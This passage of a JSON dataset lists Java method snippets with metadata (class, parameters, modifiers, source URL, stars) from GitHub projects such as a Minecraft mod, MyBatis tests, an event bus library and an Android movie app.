(Map)current;\n            for(final Object key : mapping.keySet()){\n                String keyStr = String.valueOf(key).trim();\n                if(StringUtils.isBlank(path)){\n                    getKeysRecursive(mapping.get(key), keyStr, collect, depth);\n                }else{\n                    getKeysRecursive(mapping.get(key), path + SPLIT_CHAR + keyStr, collect, depth);\n                }\n            }\n        }else if(current instanceof List){\n            List lists = (List) current;\n            for(int i = 0; i < lists.size(); i++){\n                getKeysRecursive(lists.get(i), path + String.format(\"[%d]\", i), collect, depth);\n            }\n        }else{\n            collect.add(path);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30623, "method_name": "isWrapClass", "class_name": "TaskConfiguration", "params": ["Class"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "    private static boolean isWrapClass(Class clz){\n        try{\n            return ((Class)clz.getField(\"TYPE\").get(null)).isPrimitive();\n        }catch(Exception e){\n            return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30624, "method_name": "getSubscriberClass", "class_name": "AbstractSubscriberInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class", "snippet": "    public Class getSubscriberClass() {\n        return subscriberClass;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 30625, "method_name": "getSuperSubscriberInfo", "class_name": "AbstractSubscriberInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SubscriberInfo", "snippet": "    public SubscriberInfo getSuperSubscriberInfo() {\n        if(superSubscriberInfoClass == null) {\n            return null;\n        }\n        try {\n            return superSubscriberInfoClass.newInstance();\n        } catch (InstantiationException e) {\n            throw new RuntimeException(e);\n        } catch (IllegalAccessException e) {\n            throw new RuntimeException(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 30626, "method_name": "shouldCheckSuperclass", "class_name": "AbstractSubscriberInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean shouldCheckSuperclass() {\n        return shouldCheckSuperclass;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 30627, "method_name": "createSubscriberMethod", "class_name": "AbstractSubscriberInfo", "params": ["String", "Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "SubscriberMethod", "snippet": "    protected SubscriberMethod createSubscriberMethod(String methodName, Class<?> eventType) {\n        return createSubscriberMethod(methodName, eventType, ThreadMode.POSTING, 0, false);\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 30628, "method_name": "createSubscriberMethod", "class_name": "AbstractSubscriberInfo", "params": ["String", "Class<?>", "ThreadMode"], "throws": null, "modifiers": ["protected"], "return_type": "SubscriberMethod", "snippet": "    protected SubscriberMethod createSubscriberMethod(String methodName, Class<?> eventType, ThreadMode threadMode) {\n        return createSubscriberMethod(methodName, eventType, threadMode, 0, false);\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 30629, "method_name": "createSubscriberMethod", "class_name": "AbstractSubscriberInfo", "params": ["String", "Class<?>", "ThreadMode", "int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "SubscriberMethod", "snippet": "    protected SubscriberMethod createSubscriberMethod(String methodName, Class<?> eventType, ThreadMode threadMode,\n                                                      int priority, boolean sticky) {\n        try {\n            Method method = subscriberClass.getDeclaredMethod(methodName, eventType);\n            return new SubscriberMethod(method, eventType, threadMode, priority, sticky);\n        } catch (NoSuchMethodException e) {\n            throw new EventBusException(\"Could not find subscriber method in \" + subscriberClass +\n                    \". Maybe a missing ProGuard rule?\", e);\n        }\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 30630, "method_name": "hasWrapperFor", "class_name": "CustomBeanWrapperFactory", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasWrapperFor(Object object) {\n    if (object instanceof Author) {\n      return true;\n    } else {\n      return false;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/CustomBeanWrapperFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectWrapperFactory"], "modifiers": ["public"]}}, {"id": 30631, "method_name": "getWrapperFor", "class_name": "CustomBeanWrapperFactory", "params": ["MetaObject", "Object"], "throws": null, "modifiers": ["public"], "return_type": "ObjectWrapper", "snippet": "  public ObjectWrapper getWrapperFor(MetaObject metaObject, Object object) {\n    return new CustomBeanWrapper(metaObject, object);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/CustomBeanWrapperFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectWrapperFactory"], "modifiers": ["public"]}}, {"id": 30632, "method_name": "initElements", "class_name": "PottedYellowAmaranthBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items.add(() -> new BlockItem(block, new Item.Properties().group(null)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30633, "method_name": "clientLoad", "class_name": "PottedYellowAmaranthBlock", "params": ["FMLClientSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clientLoad(FMLClientSetupEvent event) {\n\t\tRenderTypeLookup.setRenderLayer(block, RenderType.getCutout());\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30634, "method_name": "isNormalCube", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean isNormalCube(BlockState state, IBlockReader worldIn, BlockPos pos) {\n\t\t\treturn false;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30635, "method_name": "propagatesSkylightDown", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean propagatesSkylightDown(BlockState state, IBlockReader reader, BlockPos pos) {\n\t\t\treturn true;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30636, "method_name": "getShape", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos", "ISelectionContext"], "throws": null, "modifiers": ["public"], "return_type": "VoxelShape", "snippet": "\t\tpublic VoxelShape getShape(BlockState state, IBlockReader world, BlockPos pos, ISelectionContext context) {\n\t\t\treturn VoxelShapes.create(0.312D, 0D, 0.312D, 0.688D, 0.375D, 0.688D);\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30637, "method_name": "tickRate", "class_name": "CustomBlock", "params": ["IWorldReader"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\tpublic int tickRate(IWorldReader world) {\n\t\t\treturn 0;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30638, "method_name": "getPickBlock", "class_name": "CustomBlock", "params": ["BlockState", "RayTraceResult", "IBlockReader", "BlockPos", "PlayerEntity"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "\t\tpublic ItemStack getPickBlock(BlockState state, RayTraceResult target, IBlockReader world, BlockPos pos, PlayerEntity player) {\n\t\t\treturn new ItemStack(YellowAmaranthBlock.block, (int) (1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30639, "method_name": "getMaterialColor", "class_name": "CustomBlock", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "MaterialColor", "snippet": "\t\tpublic MaterialColor getMaterialColor(BlockState state, IBlockReader blockAccess, BlockPos pos) {\n\t\t\treturn MaterialColor.STONE;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30640, "method_name": "getPushReaction", "class_name": "CustomBlock", "params": ["BlockState"], "throws": null, "modifiers": ["public"], "return_type": "PushReaction", "snippet": "\t\tpublic PushReaction getPushReaction(BlockState state) {\n\t\t\treturn PushReaction.DESTROY;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30641, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(Blocks.FLOWER_POT, (int) (1)));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30642, "method_name": "removedByPlayer", "class_name": "CustomBlock", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "boolean", "IFluidState"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean removedByPlayer(BlockState state, World world, BlockPos pos, PlayerEntity entity, boolean willHarvest, IFluidState fluid) {\n\t\t\tboolean retval = super.removedByPlayer(state, world, pos, entity, willHarvest, fluid);\n\t\t\tint x = pos.getX();\n\t\t\tint y = pos.getY();\n\t\t\tint z = pos.getZ();\n\t\t\t{\n\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\n\t\t\t\t$_dependencies.put(\"x\", x);\n\t\t\t\t$_dependencies.put(\"y\", y);\n\t\t\t\t$_dependencies.put(\"z\", z);\n\t\t\t\t$_dependencies.put(\"world\", world);\n\t\t\t\tYellowAmaranthPlayerProcedure.executeProcedure($_dependencies);\n\t\t\t}\n\t\t\treturn retval;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30643, "method_name": "onExplosionDestroy", "class_name": "CustomBlock", "params": ["World", "BlockPos", "Explosion"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void onExplosionDestroy(World world, BlockPos pos, Explosion e) {\n\t\t\tsuper.onExplosionDestroy(world, pos, e);\n\t\t\tint x = pos.getX();\n\t\t\tint y = pos.getY();\n\t\t\tint z = pos.getZ();\n\t\t\t{\n\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\n\t\t\t\t$_dependencies.put(\"x\", x);\n\t\t\t\t$_dependencies.put(\"y\", y);\n\t\t\t\t$_dependencies.put(\"z\", z);\n\t\t\t\t$_dependencies.put(\"world\", world);\n\t\t\t\tYellowAmaranthExplosionProcedure.executeProcedure($_dependencies);\n\t\t\t}\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30644, "method_name": "onBlockActivated", "class_name": "CustomBlock", "params": ["BlockState", "World", "BlockPos", "PlayerEntity", "Hand", "BlockRayTraceResult"], "throws": null, "modifiers": ["public"], "return_type": "ActionResultType", "snippet": "\t\tpublic ActionResultType onBlockActivated(BlockState state, World world, BlockPos pos, PlayerEntity entity, Hand hand,\n\t\t\t\tBlockRayTraceResult hit) {\n\t\t\tsuper.onBlockActivated(state, world, pos, entity, hand, hit);\n\t\t\tint x = pos.getX();\n\t\t\tint y = pos.getY();\n\t\t\tint z = pos.getZ();\n\t\t\tDirection direction = hit.getFace();\n\t\t\t{\n\t\t\t\tjava.util.HashMap<String, Object> $_dependencies = new java.util.HashMap<>();\n\t\t\t\t$_dependencies.put(\"entity\", entity);\n\t\t\t\t$_dependencies.put(\"x\", x);\n\t\t\t\t$_dependencies.put(\"y\", y);\n\t\t\t\t$_dependencies.put(\"z\", z);\n\t\t\t\t$_dependencies.put(\"world\", world);\n\t\t\t\tRightClickedYellowAmaranthProcedure.executeProcedure($_dependencies);\n\t\t\t}\n\t\t\treturn ActionResultType.SUCCESS;\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/PottedYellowAmaranthBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30645, "method_name": "serializeAndDeserializeObject", "class_name": "UtilityTester", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void serializeAndDeserializeObject(Object myObject) {\n\n    try {\n      deserialzeObject(serializeObject(myObject));\n    } catch (IOException e) {\n      System.out.println(\"Exception: \" + e.toString());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/UtilityTester.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30646, "method_name": "serializeObject", "class_name": "UtilityTester", "params": ["Object"], "throws": ["IOException"], "modifiers": ["private", "static"], "return_type": "byte", "snippet": "  private static byte[] serializeObject(Object myObject) throws IOException {\n    try {\n      ByteArrayOutputStream myByteArrayOutputStream = new ByteArrayOutputStream();\n\n      // Serialize to a byte array\n      try (ObjectOutputStream myObjectOutputStream = new ObjectOutputStream(myByteArrayOutputStream)) {\n        myObjectOutputStream.writeObject(myObject);\n      }\n\n      // Get the bytes of the serialized object\n      byte[] myResult = myByteArrayOutputStream.toByteArray();\n      return myResult;\n    } catch (Exception anException) {\n      throw new RuntimeException(\"Problem serializing: \" + anException.toString(), anException);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/UtilityTester.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30647, "method_name": "deserialzeObject", "class_name": "UtilityTester", "params": ["byte"], "throws": null, "modifiers": ["private", "static"], "return_type": "Object", "snippet": "  private static Object deserialzeObject(byte[] aSerializedObject) {\n    // Deserialize from a byte array\n    try (ObjectInputStream myObjectInputStream = new ObjectInputStream(new ByteArrayInputStream(aSerializedObject))) {\n      return myObjectInputStream.readObject();\n    }\n    catch (Exception anException) {\n      throw new RuntimeException(\"Problem deserializing\", anException);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/serializecircular/UtilityTester.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30648, "method_name": "numIslands", "class_name": "NumberOfIslands", "params": ["char"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int numIslands(char[][] grid) {\n        int count = 0;\n\n        for(int i = 0; i < grid.length; i ++) {\n            for(int j = 0; j < grid[i].length; j ++) {\n                if(grid[i][j] == '1') {\n                    fill(grid, i, j);\n                    count ++;\n                }\n            }\n        }\n\n        return count;\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/NumberOfIslands.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30649, "method_name": "fill", "class_name": "NumberOfIslands", "params": ["char", "int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void fill(char[][] grid, int i, int j) {\n        if(i < 0 || i >= grid.length || j < 0 || j >= grid[i].length || grid[i][j] == '0') {\n            return;\n        }\n\n        grid[i][j] = '0';\n\n        fill(grid, i + 1, j);\n        fill(grid, i - 1, j);\n        fill(grid, i, j + 1);\n        fill(grid, i, j - 1);\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/NumberOfIslands.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30650, "method_name": "deuCerto", "class_name": "Transacao", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean deuCerto() {\n\t\tSystem.out.println(\"transacao deuCerto\");\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/Transacao.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30651, "method_name": "setupDb", "class_name": "DuplicateStatementsTest", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void setupDb() throws Exception {\n      // create a SqlSessionFactory\n      try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/duplicate_statements/mybatis-config.xml\")) {\n        sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n      }\n\n      // populate in-memory database\n      BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n              \"org/apache/ibatis/submitted/duplicate_statements/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30652, "method_name": "shouldGetAllUsers", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAllUsers() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      List<User> users = mapper.getAllUsers();\n      Assertions.assertEquals(10, users.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30653, "method_name": "shouldGetFirstFourUsers", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetFirstFourUsers() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      List<User> users = mapper.getAllUsers(new RowBounds(0, 4));\n      Assertions.assertEquals(4, users.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30654, "method_name": "shouldGetAllUsers_Annotated", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAllUsers_Annotated() {\n    sqlSessionFactory.getConfiguration().addMapper(AnnotatedMapper.class);\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n      List<User> users = mapper.getAllUsers();\n      Assertions.assertEquals(10, users.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30655, "method_name": "shouldGetFirstFourUsers_Annotated", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetFirstFourUsers_Annotated() {\n    sqlSessionFactory.getConfiguration().addMapper(AnnotatedMapper.class);\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      AnnotatedMapper mapper = sqlSession.getMapper(AnnotatedMapper.class);\n      List<User> users = mapper.getAllUsers(new RowBounds(0, 4));\n      Assertions.assertEquals(4, users.size());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30656, "method_name": "shouldFailForDuplicateMethod", "class_name": "DuplicateStatementsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldFailForDuplicateMethod() {\n    Assertions.assertThrows(IllegalArgumentException.class,\n        () -> sqlSessionFactory.getConfiguration().addMapper(AnnotatedMapperExtended.class));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/duplicate_statements/DuplicateStatementsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30657, "method_name": "startActivity", "class_name": "TrailerPlayerActivity", "params": ["Activity", "String", "Media"], "throws": null, "modifiers": ["public", "static"], "return_type": "Intent", "snippet": "    public static Intent startActivity(Activity activity, String youTubeUrl, Media data) {\n        Intent i = new Intent(activity, TrailerPlayerActivity.class);\n        i.putExtra(DATA, data);\n        i.putExtra(LOCATION, youTubeUrl);\n        activity.startActivity(i);\n        return i;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 30658, "method_name": "onCreate", "class_name": "TrailerPlayerActivity", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {\n\n        MobileButterApplication.getAppContext()\n                .getComponent()\n                .inject(this);\n        super.onCreate(savedInstanceState, R.layout.activity_videoplayer);\n\n        mMedia = getIntent().getParcelableExtra(DATA);\n        mMedia.title += \" \" + getString(R.string.trailer);\n        String youTubeUrl = getIntent().getStringExtra(LOCATION);\n\n        mStreamInfo = new StreamInfo(mMedia, null, null, null, null, null);\n\n        mVideoPlayerFragment = (VideoPlayerFragment) getSupportFragmentManager().findFragmentById(R.id.video_fragment);\n        mVideoPlayerFragment.enableSubsButton(false);\n\n        QueryYouTubeTask youTubeTask = new QueryYouTubeTask(youTubeManager);\n        youTubeTask.execute(youTubeManager.getYouTubeVideoId(youTubeUrl));\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 30659, "method_name": "onOptionsItemSelected", "class_name": "TrailerPlayerActivity", "params": ["MenuItem"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onOptionsItemSelected(MenuItem item) {\n        switch (item.getItemId()) {\n            case android.R.id.home:\n                finish();\n                return true;\n        }\n        return super.onOptionsItemSelected(item);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 30660, "method_name": "getResumePosition", "class_name": "TrailerPlayerActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getResumePosition() {\n        return 0L;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 30661, "method_name": "getInfo", "class_name": "TrailerPlayerActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "StreamInfo", "snippet": "    public StreamInfo getInfo() {\n        return mStreamInfo;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 30662, "method_name": "getService", "class_name": "TrailerPlayerActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TorrentService", "snippet": "    public TorrentService getService() {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "ButterBaseActivity", "implements": ["VideoPlayerFragment"], "modifiers": ["public"]}}, {"id": 30663, "method_name": "doInBackground", "class_name": "QueryYouTubeTask", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "Uri", "snippet": "        protected Uri doInBackground(String... params) {\n            String uriStr = null;\n            String videoId = params[0];\n\n            if (isCancelled())\n                return null;\n\n            try {\n                if (isCancelled())\n                    return null;\n\n                ////////////////////////////////////\n                // calculate the actual URL of the video, encoded with proper YouTube token\n                uriStr = youTubeManager.calculateYouTubeUrl(\"22\", true, videoId);\n\n                if (isCancelled())\n                    return null;\n\n            } catch (Exception e) {\n                Log.e(this.getClass().getSimpleName(), \"Error occurred while retrieving information from YouTube.\", e);\n            }\n\n            if (uriStr != null) {\n                return Uri.parse(uriStr);\n            } else {\n                return null;\n            }\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/TrailerPlayerActivity.java", "stars": "4", "class_props": {"extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"id": 30664, "method_name": "onPostExecute", "class_name": "QueryYouTubeTask", "params": ["Uri"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void onPostExecute(Uri result) {\n            super.onPostExecute(result);\n\n            try {\n                if (isCancelled())\n                    return;\n\n                if (result == null) {\n                    throw new RuntimeException(\"Invalid NULL Url.\");\n                }\n\n                mStreamInfo.setVideoLocation(URLDecoder.decode(result.toString()));\n\n                mVideoPlayerFragment.onMediaReady();\n            } catch (Exception e) {\n                Log.e(this.getClass().getSimpleName(), \"Error playing video!\", e);\n\n                if (!mShowedError) {\n                    showErrorAlert();\n                }\n            }\n        }", "url": 